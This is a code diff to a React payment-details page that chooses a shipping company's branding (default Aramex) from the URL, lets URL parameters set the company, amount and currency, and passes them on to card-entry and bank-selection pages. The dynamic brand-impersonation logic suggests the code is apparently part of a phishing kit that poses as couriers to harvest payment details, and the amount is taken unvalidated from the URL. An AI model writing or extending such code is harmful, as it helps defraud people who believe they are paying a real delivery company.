@@ -11,21 +11,27 @@ import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
+import PageLoader from "@/components/PageLoader";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
 
-  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const urlParams = new URLSearchParams(window.location.search);
+  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
+  const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const shippingInfo = linkData?.payload as any;
+  
+  const amountParam = urlParams.get('amount');
+  const currencyParam = urlParams.get('currency');
+  
   const countryCode = shippingInfo?.selectedCountry || "SA";
   const currencyInfo = getCurrencyByCountry(countryCode);
 
-  const rawAmount = shippingInfo?.cod_amount;
+  const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
   let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
@@ -38,7 +44,11 @@ const PaymentDetails = () => {
     }
   }
 
-  const formattedAmount = formatCurrency(amount, countryCode);
+  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);
+
+  if (isLoading) {
+    return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
+  }
   
   const detectedEntity = detectEntityFromURL();
   const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
@@ -50,11 +60,11 @@ const PaymentDetails = () => {
   const handleProceed = () => {
     const paymentMethod = shippingInfo?.payment_method || 'card';
     
-    if (paymentMethod === 'card') {
-      navigate(`/pay/${id}/card-input`);
-    } else {
-      navigate(`/pay/${id}/bank-selector`);
-    }
+    const nextUrl = paymentMethod === 'card' 
+      ? `/pay/${id}/card-input?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`
+      : `/pay/${id}/bank-selector?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`;
+    
+    navigate(nextUrl);
   };
   
   return (
